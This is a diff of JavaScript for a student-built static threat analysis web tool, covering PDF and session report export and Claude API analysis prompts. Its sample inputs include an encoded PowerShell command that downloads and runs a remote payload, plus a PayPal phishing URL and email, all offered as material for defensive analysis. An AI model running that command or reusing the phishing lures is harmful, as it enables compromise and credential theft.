+      _pdfText(doc, PDF_THEME.dimText);
+      doc.setFontSize(6);
+      doc.text(`  + ${vals.length - 12} more entries omitted`, ml + 4, y + 4.5);
+      y += 7;
+    }
+    y += 3;
+  });
+  return y;
+}
+
+function _drawMITRE(doc, ml, y, cw, mitre) {
+  if (!mitre || !mitre.length) return y;
+  const cols = 4, cellW = cw / cols, cellH = 12;
+  mitre.forEach((t, i) => {
+    const col = i % cols;
+    const cx  = ml + col * cellW;
+    const cy  = y + Math.floor(i / cols) * (cellH + 2);
+    _drawCard(doc, cx, cy, cellW - 2, cellH);
+    _pdfFill(doc, PDF_THEME.accent);
+    doc.roundedRect(cx, cy, cellW - 2, 2, 0.5, 0.5, 'F');
+    _pdfText(doc, PDF_THEME.infoFg);
+    doc.setFontSize(6.5);
+    doc.setFont('helvetica', 'bold');
+    doc.text(doc.splitTextToSize(String(t), cellW - 6)[0] || '', cx + (cellW - 2) / 2, cy + 8, { align: 'center' });
+  });
+  return y + Math.ceil(mitre.length / cols) * (cellH + 2) + 4;
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// exportPDF(type) — single scan report
+// ═══════════════════════════════════════════════════════════════════
+function exportPDF(type) {
+  const data = lastScanData[type];
+  if (!data) { toast('No scan data. Run a scan first.', 'r'); return; }
+
+  const { jsPDF } = window.jspdf;
+  const doc = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });
+  const pageW = 210, pageH = 297, ml = 14, cw = pageW - 28;
+
+  const titles = { zip: 'ZIP FILE SCAN REPORT', ps: 'POWERSHELL ANALYSIS REPORT', url: 'URL ANALYSIS REPORT', eml: 'EMAIL SCAN REPORT' };
+  const reportTitle = titles[type] || 'SECURITY SCAN REPORT';
+  const score    = data?.risk_score || 0;
+  const lvl      = data?.risk_level  || 'LOW';
+  const stats    = data?.stats || {};
+  const inds     = data?.indicators || data?.archive_indicators || [];
+  const iocs     = data?.iocs || {};
+  const mitre    = data?.mitre || [];
+  const scanName = data?.filename || data?.url || data?.subject || data?.name || 'Unknown Target';
+
+  _drawPageBackground(doc, pageW, pageH);
+  _drawWatermark(doc, pageW, pageH);
+  _drawHeader(doc, pageW, type, reportTitle);
+  let y = 30;
+
+  // Summary + Score gauge
+  y = _drawSectionLabel(doc, ml, y, 'SCAN SUMMARY', cw);
+  const gaugeW = 46, summW = cw - gaugeW - 4;
+  const summCardY = y;
+  y = _drawSummaryCard(doc, ml, y, summW, scanName, type, stats);
+  _drawScoreGauge(doc, ml + summW + 4, summCardY, score, lvl);
+
+  // Stats bar
+  const iocTotal = Object.values(iocs).reduce((a, v) => a + (v?.length || 0), 0);
+  const statItems = [
+    { label: 'Total Files',  value: stats.total       || 0 },
+    { label: 'Threats',      value: stats.threats     || 0, color: PDF_THEME.highFg },
+    { label: 'Scripts',      value: stats.scripts     || 0, color: PDF_THEME.medFg  },
+    { label: 'Executables',  value: stats.executables || 0, color: PDF_THEME.medFg  },
+    { label: 'IOCs',         value: stats.iocs || iocTotal, color: PDF_THEME.infoFg },
+  ].filter(s => s.value > 0 || s.label === 'Total Files');
+  if (statItems.length > 1) {
+    y = _drawSectionLabel(doc, ml, y, 'SCAN STATISTICS', cw);
+    y = _drawStatsBar(doc, ml, y, cw, statItems);
+  }
+
+  // Risk assessment block
+  y = _drawSectionLabel(doc, ml, y, 'RISK ASSESSMENT', cw);
+  const { fg: rFg, bg: rBg, border: rBorder } = _riskColors(lvl);
+  _pdfFill(doc, rBg); _pdfDraw(doc, rBorder);
+  doc.setLineWidth(0.4);
+  doc.roundedRect(ml, y, cw, 16, 1.5, 1.5, 'FD');
+  _pdfFill(doc, rFg);
+  doc.roundedRect(ml, y, 3, 16, 0.5, 0.5, 'F');
+  _pdfText(doc, rFg);
+  doc.setFontSize(10); doc.setFont('helvetica', 'bold');
+  doc.text(lvl + ' RISK', ml + 6, y + 7);
+  _pdfText(doc, PDF_THEME.bodyText);
+  doc.setFontSize(7); doc.setFont('helvetica', 'normal');
+  const rDesc = lvl === 'HIGH' ? 'Malicious content detected. Immediate investigation recommended.'
+              : lvl === 'MEDIUM' ? 'Suspicious patterns found. Manual review advised.'
+              : 'No significant threats detected. File appears clean.';
+  doc.text(rDesc, ml + 6, y + 12.5);
+  _pdfText(doc, rFg);
+  doc.setFontSize(14); doc.setFont('helvetica', 'bold');
+  doc.text(`${score}/100`, ml + cw - 6, y + 10, { align: 'right' });
+  y += 22;
+
+  // Indicators
+  if (inds.length) {
+    y = _drawSectionLabel(doc, ml, y, `DETECTED THREATS  (${inds.length} indicators)`, cw);
+    y = _drawIndicatorsTable(doc, ml, y, cw, inds, pageH, pageW, type, reportTitle);
+  }
+
+  // MITRE
+  if (mitre.length) {
+    y = _checkPageBreak(doc, y, pageH - 50, pageH, pageW, type, reportTitle);
+    y = _drawSectionLabel(doc, ml, y, `MITRE ATT&CK TECHNIQUES  (${mitre.length} detected)`, cw);
+    y = _drawMITRE(doc, ml, y, cw, mitre);
+  }
+
+  // IOCs
+  if (Object.values(iocs).some(v => v && v.length)) {
+    y = _checkPageBreak(doc, y, pageH - 50, pageH, pageW, type, reportTitle);
+    y = _drawSectionLabel(doc, ml, y, 'EXTRACTED INDICATORS OF COMPROMISE (IOCs)', cw);
+    y = _drawIOCTable(doc, ml, y, cw, iocs, pageH, pageW, type, reportTitle);
+  }
+
+  // Disclaimer
+  y = _checkPageBreak(doc, y, pageH - 30, pageH, pageW, type, reportTitle);
+  y = _drawSectionLabel(doc, ml, y, 'ANALYSIS NOTES', cw);
+  _drawCard(doc, ml, y, cw, 18);
+  _pdfFill(doc, PDF_THEME.accent); doc.roundedRect(ml, y, 2, 18, 0.5, 0.5, 'F');
+  _pdfText(doc, PDF_THEME.bodyText);
+  doc.setFontSize(6.5); doc.setFont('helvetica', 'normal');
+  doc.text('This report was generated by RAPTOR Threat Analysis Platform using static analysis techniques.', ml + 5, y + 6.5);
+  doc.text('No code was executed during analysis. Results should be validated with dynamic sandbox analysis', ml + 5, y + 11);
+  doc.text('before making final security decisions.', ml + 5, y + 15.5);
+
+  // Footers
+  const totalPages = doc.internal.getNumberOfPages();
+  for (let i = 1; i <= totalPages; i++) { doc.setPage(i); _drawFooter(doc, pageW, pageH, i, totalPages, null); }
+
+  doc.save(`RAPTOR_${(type || 'SCAN').toUpperCase()}_Report_${Date.now()}.pdf`);
+  toast('Enterprise PDF report exported!', 'g');
+}
+
+function exportFullPDF() {
+  if (!sessionScans.length) { toast('No scans in session yet.', 'r'); return; }
+  const { jsPDF } = window.jspdf;
+  const doc = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });
+  const pageW = 210, pageH = 297, ml = 14, cw = pageW - 28;
+  const highCount = sessionScans.filter(s => s.risk === 'HIGH').length;
+  const medCount  = sessionScans.filter(s => s.risk === 'MEDIUM').length;
+  const lowCount  = sessionScans.filter(s => s.risk === 'LOW').length;
+  const RT = 'FULL SESSION SECURITY REPORT';
+  _drawPageBackground(doc, pageW, pageH);
+  _drawWatermark(doc, pageW, pageH);
+  _drawHeader(doc, pageW, 'SESSION', RT);
+  let y = 34;
+  _pdfText(doc, PDF_THEME.titleText);
+  doc.setFontSize(20); doc.setFont('helvetica', 'bold');
+  doc.text('Security Analysis Report', ml, y); y += 8;
+  _pdfText(doc, PDF_THEME.dimText);
+  doc.setFontSize(8.5); doc.setFont('helvetica', 'normal');
+  doc.text('RAPTOR Threat Analysis Platform  ·  Full Session Export', ml, y); y += 12;
+  _pdfFill(doc, PDF_THEME.accent); doc.rect(ml, y, 28, 1.2, 'F'); y += 10;
+  const summaryStats = [
+    { label: 'Total Scans', value: sessionScans.length, color: PDF_THEME.accent },
+    { label: 'High Risk',   value: highCount,           color: PDF_THEME.highFg },
+    { label: 'Medium Risk', value: medCount,            color: PDF_THEME.medFg  },
+    { label: 'Total IOCs',  value: totalIOCs,           color: PDF_THEME.infoFg },
+  ];
+  const bigCW = cw / 4, bigCH = 26;
+  summaryStats.forEach((item, i) => {
+    const cx = ml + i * bigCW;
+    _drawCard(doc, cx, y, bigCW - 2, bigCH);
+    _pdfFill(doc, item.color); doc.roundedRect(cx, y, bigCW - 2, 2.5, 0.5, 0.5, 'F');
+    _pdfText(doc, item.color); doc.setFontSize(20); doc.setFont('helvetica', 'bold');
+    doc.text(String(item.value), cx + (bigCW - 2) / 2, y + 17, { align: 'center' });
+    _pdfText(doc, PDF_THEME.dimText); doc.setFontSize(6); doc.setFont('helvetica', 'normal');
+    doc.text(item.label.toUpperCase(), cx + (bigCW - 2) / 2, y + 22, { align: 'center' });
+  });
+  y += bigCH + 10;
+  y = _drawSectionLabel(doc, ml, y, 'RISK DISTRIBUTION', cw);
+  const barH = 8;
+  _pdfFill(doc, PDF_THEME.divider); doc.roundedRect(ml, y, cw, barH, 1, 1, 'F');
+  let barX = ml;
+  const total = sessionScans.length;
+  if (highCount) { const w=(highCount/total)*cw; _pdfFill(doc,PDF_THEME.highFg); doc.roundedRect(barX,y,w,barH,1,1,'F'); barX+=w; }
+  if (medCount)  { const w=(medCount/total)*cw;  _pdfFill(doc,PDF_THEME.medFg);  doc.rect(barX,y,w,barH,'F'); barX+=w; }
+  if (lowCount)  { const w=(lowCount/total)*cw;  _pdfFill(doc,PDF_THEME.lowFg);  doc.rect(barX,y,w,barH,'F'); }
+  y += barH + 3;
+  [{ label:`High (${highCount})`,color:PDF_THEME.highFg },{ label:`Medium (${medCount})`,color:PDF_THEME.medFg },{ label:`Low (${lowCount})`,color:PDF_THEME.lowFg }]
+    .forEach((item, i) => {
+      const lx = ml + i * 38;
+      _pdfFill(doc, item.color); doc.roundedRect(lx, y, 3, 3, 0.5, 0.5, 'F');
+      _pdfText(doc, PDF_THEME.bodyText); doc.setFontSize(6.2); doc.setFont('helvetica', 'normal');
+      doc.text(item.label, lx + 4.5, y + 2.5);
+    });
+  y += 10;
+  y = _drawSectionLabel(doc, ml, y, `SCAN LOG  (${sessionScans.length} scans)`, cw);
+  const tHdrH = 8;
+  const drawTblHdr = (yy) => {
+    _pdfFill(doc, [237,242,255]); _pdfDraw(doc, PDF_THEME.border);
+    doc.setLineWidth(0.25); doc.roundedRect(ml, yy, cw, tHdrH, 1, 1, 'FD');
+    _pdfText(doc, PDF_THEME.infoFg); doc.setFontSize(6.2); doc.setFont('helvetica', 'bold');
+    doc.text('#',         ml+3,    yy+5.2);
+    doc.text('TYPE',      ml+10,   yy+5.2);
+    doc.text('TARGET',    ml+28,   yy+5.2);
+    doc.text('RISK',      ml+cw-48,yy+5.2);
+    doc.text('SCORE',     ml+cw-28,yy+5.2);
+    doc.text('TIMESTAMP', ml+cw-2, yy+5.2, { align: 'right' });
+    return yy + tHdrH;
+  };
+  y = drawTblHdr(y);
+  sessionScans.forEach((s, i) => {
+    if (y > pageH - 20) {
+      doc.addPage(); _drawPageBackground(doc,pageW,pageH); _drawWatermark(doc,pageW,pageH);
+      _drawHeader(doc,pageW,'SESSION',RT); y = 30; y = drawTblHdr(y);
+    }
+    const rowH = 10;
+    const { fg: rFg, bg: rBg } = _riskColors(s.risk);
+    _pdfFill(doc, i%2===0 ? PDF_THEME.cardBg : PDF_THEME.rowAlt);
+    _pdfDraw(doc, PDF_THEME.divider); doc.setLineWidth(0.12);
+    doc.rect(ml, y, cw, rowH, 'FD');
+    _pdfFill(doc, rFg); doc.rect(ml, y, 1.5, rowH, 'F');
+    _pdfText(doc, PDF_THEME.dimText); doc.setFontSize(6); doc.setFont('helvetica','normal');
+    doc.text(String(i+1), ml+3.5, y+6.5);
+    _pdfFill(doc,[237,242,255]); _pdfDraw(doc,[196,212,252]); doc.setLineWidth(0.2);
+    doc.roundedRect(ml+8, y+2, 18, 6, 0.6, 0.6, 'FD');
+    _pdfText(doc, PDF_THEME.infoFg); doc.setFontSize(5.5); doc.setFont('helvetica','bold');
+    doc.text((s.type||'').toUpperCase(), ml+17, y+5.8, { align:'center' });
+    _pdfText(doc, PDF_THEME.bodyText); doc.setFontSize(6.8); doc.setFont('helvetica','normal');
+    doc.text((s.name||'').substring(0,60), ml+28, y+6.5);
+    _pdfFill(doc,rBg); _pdfDraw(doc,rFg); doc.setLineWidth(0.2);
+    doc.roundedRect(ml+cw-50, y+2, 18, 6, 0.6, 0.6, 'FD');
+    _pdfText(doc,rFg); doc.setFontSize(5.8); doc.setFont('helvetica','bold');
+    doc.text(s.risk, ml+cw-41, y+5.8, { align:'center' });
+    _pdfText(doc,rFg); doc.setFontSize(8); doc.setFont('helvetica','bold');
+    doc.text(`${s.score}`, ml+cw-26, y+6.8);
+    _pdfText(doc,PDF_THEME.dimText); doc.setFontSize(5.8); doc.setFont('helvetica','normal');
+    doc.text(s.time||'', ml+cw-2, y+6.5, { align:'right' });
+    y += rowH;
+  });
+  _pdfDraw(doc, PDF_THEME.border); doc.setLineWidth(0.35);
+  doc.line(ml, y, ml+cw, y); y += 10;
+  if (y > pageH - 30) {
+    doc.addPage(); _drawPageBackground(doc,pageW,pageH); _drawWatermark(doc,pageW,pageH);
+    _drawHeader(doc,pageW,'SESSION',RT); y = 30;
+  }
+  _drawCard(doc, ml, y, cw, 16);
+  _pdfFill(doc, PDF_THEME.medFg); doc.roundedRect(ml, y, 2, 16, 0.5, 0.5, 'F');
+  _pdfText(doc, PDF_THEME.medFg); doc.setFontSize(6.5); doc.setFont('helvetica','bold');
+  doc.text('DISCLAIMER', ml+5, y+6);
+  _pdfText(doc, PDF_THEME.bodyText); doc.setFontSize(6.5); doc.setFont('helvetica','normal');
+  doc.text('This report is based on static analysis only. No code was executed. Results should be validated with', ml+5, y+10.5);
+  doc.text('dynamic sandbox analysis before making final security decisions.', ml+5, y+14.5);
+  const totalPages = doc.internal.getNumberOfPages();
+  for (let i = 1; i <= totalPages; i++) { doc.setPage(i); _drawFooter(doc,pageW,pageH,i,totalPages,null); }
+  doc.save(`RAPTOR_SessionReport_${Date.now()}.pdf`);
+  toast('Full session PDF report exported!', 'g');
+}
+
+// ══════════════════════════════════════════════════════════
+// REPORT TEXT
+// ══════════════════════════════════════════════════════════
+// REPORT TEXT
+// ══════════════════════════════════════════════════════════
+function generateReport(){
+  if(!sessionScans.length){toast('No scans yet','r');return;}
+  const lines=['═══════════════════════════════════════════════════════','      MINI THREAT ANALYZER v4 — SESSION REPORT','      Moksh Shah | 250103003015 | MSc DFIS Sem 2 | NFSU','      Guide: Dr. Ramya Shah | Assistant Professor, NFSU','═══════════════════════════════════════════════════════',`Generated : ${now()}`,`Scans     : ${sessionScans.length}  |  HIGH: ${sessionScans.filter(s=>s.risk==='HIGH').length}  |  IOCs: ${totalIOCs}`,''];
+  sessionScans.forEach((s,i)=>{
+    lines.push(`─── SCAN #${i+1}: ${s.type} ──────────────────`);
+    lines.push(`Target  : ${s.name}`);lines.push(`Risk    : ${s.risk} (${s.score}/100)`);lines.push(`Time    : ${s.time}`);lines.push('');
+  });
+  lines.push('═══════════════════════════════════════════════════════');
+  lines.push('DISCLAIMER: Static analysis only. No code executed.');
+  lines.push('Not a substitute for dynamic sandbox analysis.');
+  lines.push('═══════════════════════════════════════════════════════');
+  $('reportOut').textContent=lines.join('\n');$('reportRes').classList.add('on');
+}
+function copyReport(){const t=$('reportOut').textContent;if(!t){generateReport();return;}navigator.clipboard.writeText(t).then(()=>toast('Copied','g')).catch(()=>toast('Failed','r'));}
+function clearSession(){sessionScans=[];totalIOCs=0;$('histList').innerHTML='<div class="no-hist">No scans yet</div>';$('reportRes').classList.remove('on');updateHeader();toast('Cleared','c');}
+
+// ── INIT ──────────────────────────────────────────────────
+checkBackend();
+
+// ══════════════════════════════════════════════════════════
+// AI ANALYSIS — CLAUDE API
+// ══════════════════════════════════════════════════════════
+let aiMode = 'general';
+let aiChatHistory = [];
+let lastAIInput = '';
+
+const AI_SYSTEM_PROMPTS = {
+  general: `You are an expert cybersecurity analyst and digital forensics investigator specializing in malware analysis, threat intelligence, and incident response. 
+Analyze the provided content and give a structured threat assessment.
+
+Format your response exactly like this:
+
+🔴 THREAT LEVEL: [HIGH / MEDIUM / LOW]
+
+📋 SUMMARY:
+[2-3 sentence overview of what this is]
+
+🦠 ATTACK TYPE:
+[Malware family / Attack category / Technique name]
+
+⚔️ MITRE ATT&CK:
+[List relevant technique IDs and names]
+
+🔍 KEY INDICATORS:
+[Bullet list of suspicious elements found]
+
+🛡️ DEFENDER ACTIONS:
+[What a blue team should do]
+
+📊 SEVERITY: [1-10] — [Brief reason]`,
+
+  ps: `You are a PowerShell malware analyst. Deeply analyze the PowerShell command or script provided.
+Decode any obfuscation, identify the attack technique, explain what it does step by step, and map it to MITRE ATT&CK.
+
+Format your response:
+
+🔴 THREAT LEVEL: [HIGH / MEDIUM / LOW]
+
+📋 WHAT IT DOES:
+[Plain English explanation of the script's purpose]
+
+🔓 OBFUSCATION TECHNIQUE:
+[Base64 / Hex / String concatenation / etc.]
+
+⚔️ MITRE ATT&CK MAPPING:
+[Technique ID — Name — Tactic]
+
+🎯 ATTACK GOAL:
+[What the attacker is trying to achieve]
+
+🔍 MALICIOUS INDICATORS:
+[Line by line breakdown of dangerous parts]
+
+🛡️ DETECTION & DEFENSE:
+[How to detect and block this]`,
+
+  url: `You are a phishing and malicious URL analyst. Analyze the provided URL for phishing indicators.
+
+Format your response:
+
+🔴 THREAT LEVEL: [HIGH / MEDIUM / LOW]
+
+📋 VERDICT:
+[Is this phishing? What type of attack?]
+
+🎯 TARGETED BRAND/VICTIM:
+[Who is being impersonated or targeted]
+
+🔍 PHISHING INDICATORS:
+[List every suspicious element: TLD, domain, params, encoding]
+
+🧩 ATTACK TECHNIQUE:
+[Credential harvesting / Drive-by download / Redirect chain / etc.]
+
+⚔️ MITRE ATT&CK:
+[Relevant techniques]
+
+🛡️ RECOMMENDATIONS:
+[What users and admins should do]`,
+
+  email: `You are a phishing email analyst. Analyze the email content for social engineering tactics, malicious links, spoofing, and attacker techniques.
+
+Format your response:
+
+🔴 THREAT LEVEL: [HIGH / MEDIUM / LOW]
+
+📋 PHISHING VERDICT:
+[Is this phishing? What type?]
+
+🎭 SOCIAL ENGINEERING TACTICS:
+[Urgency / Fear / Authority / Impersonation / etc.]
+
+🔍 SUSPICIOUS ELEMENTS:
+[Headers, links, attachments, sender address anomalies]
+
+🎯 TARGET & MOTIVE:
+[Who is targeted, what the attacker wants]
+
+⚔️ MITRE ATT&CK:
+[T1566 Spearphishing + relevant sub-techniques]
+
+🛡️ USER GUIDANCE:
+[What the recipient should do]`,
+
+  explain: `You are a cybersecurity educator explaining threats to MSc Digital Forensics students. 
+Provide a detailed, educational explanation of the attack or concept described.
+
+Format your response:
+
+📖 CONCEPT OVERVIEW:
+[Clear explanation of what this attack/technique is]
+
+🔬 HOW IT WORKS:
+[Step-by-step technical breakdown]
+
+📚 REAL WORLD EXAMPLES:
+[Known malware or incidents that used this technique]
+
+⚔️ MITRE ATT&CK CONTEXT:
+[Where this fits in the ATT&CK framework]
+
+🛡️ DEFENSIVE COUNTERMEASURES:
+[Detection methods, prevention strategies]
+
+🎓 KEY TAKEAWAY:
+[One sentence summary for exam/presentation use]`
+};
+
+function setAIMode(mode) {
+  aiMode = mode;
+  document.querySelectorAll('.ai-mode-btn').forEach(b => b.classList.remove('active'));
+  $('mode-' + mode).classList.add('active');
+  toast('Mode: ' + mode.toUpperCase(), 'c');
+}
+
+function loadAISample() {
+  const samples = {
+    general: `powershell -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADoANAA0ADQANAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkA`,
+    ps: `powershell -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADoANAA0ADQANAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkA`,
+    url: `http://secure-paypal-account-verify.xyz/login?redirect=paypal.com&cmd=exec&b64=SQBFAFgA`,
+    email: `From: security@paypa1-verify.com
+Subject: URGENT: Your account will be suspended in 24 hours
+
+Dear Customer,
+
+We detected suspicious activity on your PayPal account. You must verify your identity immediately or your account will be permanently suspended.
+
+Click here to verify: http://secure-paypal-login.xyz/verify?token=abc123
+
+This link expires in 24 hours.
+
+PayPal Security Team`,
+    explain: `What is a ClickFix attack and how does it use PowerShell to deliver malware?`
+  };
+  $('aiInput').value = samples[aiMode] || samples.general;
+  toast('Sample loaded', 'c');
+}
+
+async function callClaudeAPI(userMessage, systemPrompt, history = []) {
+  const messages = [];
+
+  // Add history
+  history.forEach(h => {
+    messages.push({ role: 'user', content: h.user });
+    messages.push({ role: 'assistant', content: h.ai });
+  });
+
+  // Add current message
+  messages.push({ role: 'user', content: userMessage });
+
+  const response = await fetch('https://api.anthropic.com/v1/messages', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      model: 'claude-sonnet-4-20250514',
+      max_tokens: 1000,
+      system: systemPrompt,
+      messages: messages
+    })
+  });
+
+  const data = await response.json();
+  const text = (data.content || []).map(b => b.text || '').join('');
+  return text || 'No response received.';
+}
+
+async function runAIAnalysis() {
+  const input = $('aiInput').value.trim();
+  if (!input) { toast('Paste something to analyze', 'r'); return; }
+
+  lastAIInput = input;
+  aiChatHistory = []; // reset chat for new analysis
+
+  $('aiRes').style.display = 'none';
+  $('aiChatHistory').style.display = 'none';
+  $('aiLd').classList.add('on');
+
+  const loadMsgs = ['AI ANALYZING...', 'DETECTING PATTERNS...', 'MAPPING TECHNIQUES...', 'GENERATING REPORT...'];
+  let li = 0;
+  const loadInterval = setInterval(() => { $('aiLm').textContent = loadMsgs[li++ % loadMsgs.length]; }, 900);
+
+  try {
+    const systemPrompt = AI_SYSTEM_PROMPTS[aiMode] || AI_SYSTEM_PROMPTS.general;
+    const contextNote = `\n\nNote: This analysis is for academic/forensic purposes for MSc DFIS student Moksh Shah at National Forensic Sciences University. Provide detailed technical analysis.`;
+    const result = await callClaudeAPI(input, systemPrompt + contextNote);
+
+    clearInterval(loadInterval);
+    $('aiLd').classList.remove('on');
+
+    // Save to chat history
+    aiChatHistory.push({ user: input, ai: result });
+
+    // Determine risk level from AI response
+    const riskLevel = result.includes('HIGH') ? 'HIGH' : result.includes('MEDIUM') ? 'MEDIUM' : 'LOW';
+    const riskColors = { HIGH: 'var(--r)', MEDIUM: 'var(--o)', LOW: 'var(--g)' };
+    const riskClass = { HIGH: 'ai-risk-high', MEDIUM: 'ai-risk-med', LOW: 'ai-risk-low' };
+
+    $('aiRiskBadge').innerHTML = `
+      <div class="${riskClass[riskLevel]}">
+        <div>
+          <div style="font-size:.52rem;letter-spacing:2px;color:var(--dim2);font-family:var(--ft);margin-bottom:3px">AI ASSESSED THREAT LEVEL</div>
+          <div style="font-family:var(--fo);font-size:1.6rem;font-weight:900;color:${riskColors[riskLevel]};text-shadow:0 0 12px ${riskColors[riskLevel]}">${riskLevel}</div>
+        </div>
+        <div style="margin-left:auto;text-align:right">
+          <div style="font-size:.52rem;color:var(--dim2);font-family:var(--ft)">ANALYSIS MODE</div>
+          <div style="font-family:var(--fo);font-size:.65rem;color:var(--p);margin-top:2px">${aiMode.toUpperCase()}</div>
+          <div style="font-size:.52rem;color:var(--dim2);font-family:var(--ft);margin-top:4px">POWERED BY</div>
+          <div style="font-size:.6rem;color:var(--p);font-family:var(--ft);font-weight:600">CLAUDE AI · ANTHROPIC</div>
+        </div>
+      </div>`;
+
+    // Render AI output with typewriter effect
+    $('aiOutput').textContent = '';
+    $('aiOutput').classList.add('ai-typing');
+    $('aiRes').style.display = 'block';
+    $('followupOut').style.display = 'none';
+
+    // Typewriter effect
+    let i = 0;
+    const speed = result.length > 800 ? 8 : 15;
+    function typeWriter() {
+      if (i < result.length) {
+        $('aiOutput').textContent += result.charAt(i);
+        i++;
+        setTimeout(typeWriter, speed);
+      } else {
+        $('aiOutput').classList.remove('ai-typing');
+      }
+    }
+    typeWriter();
+
+    $('aiTS').textContent = 'AI Analysis: ' + now();
+    addHistory('AI', input.substring(0, 45) + '…', riskLevel, riskLevel === 'HIGH' ? 85 : riskLevel === 'MEDIUM' ? 50 : 20);
+    updateHeader();
+    toast('AI analysis complete', 'g');
+
+  } catch (e) {
+    clearInterval(loadInterval);
+    $('aiLd').classList.remove('on');
+    $('aiRes').style.display = 'block';
+    $('aiRiskBadge').innerHTML = '';
+    $('aiOutput').textContent = '❌ AI Error: ' + e.message + '\n\nMake sure you are running this from claude.ai or a platform with Anthropic API access.';
+    toast('AI error: ' + e.message, 'r');
+  }
+}
+
+async function askFollowup() {
+  const q = $('aiFollowup').value.trim();
+  if (!q) { toast('Type a question first', 'r'); return; }
+  await quickAsk(q);
+  $('aiFollowup').value = '';
+}
+
+async function quickAsk(question) {
+  if (!lastAIInput) { toast('Run an analysis first', 'r'); return; }
+
+  $('followupOut').style.display = 'block';
+  $('followupText').textContent = '🤖 AI thinking...';
+
+  // Add to chat log
+  $('aiChatHistory').style.display = 'block';
+  const chatLog = $('aiChatLog');
+  const userDiv = document.createElement('div');
+  userDiv.className = 'chat-msg chat-user';
+  userDiv.textContent = '👤 ' + question;
+  chatLog.appendChild(userDiv);
+
+  try {
+    const contextPrompt = `You are a cybersecurity analyst. The user previously analyzed this content:\n\n"${lastAIInput.substring(0, 500)}"\n\nAnswer their follow-up question concisely and accurately.`;
+    const answer = await callClaudeAPI(question, contextPrompt, aiChatHistory.slice(-3));
+
+    $('followupText').textContent = answer;
+
+    // Add AI response to chat log
+    const aiDiv = document.createElement('div');
+    aiDiv.className = 'chat-msg chat-ai';
+    aiDiv.textContent = '🤖 ' + answer;
+    chatLog.appendChild(aiDiv);
+    chatLog.scrollTop = chatLog.scrollHeight;
+
+    // Save to history
+    aiChatHistory.push({ user: question, ai: answer });
+    toast('AI responded', 'g');
+
+  } catch (e) {
+    $('followupText').textContent = '❌ Error: ' + e.message;
+    toast('AI error', 'r');
+  }
+}
+</script>
+</body>
+</html>
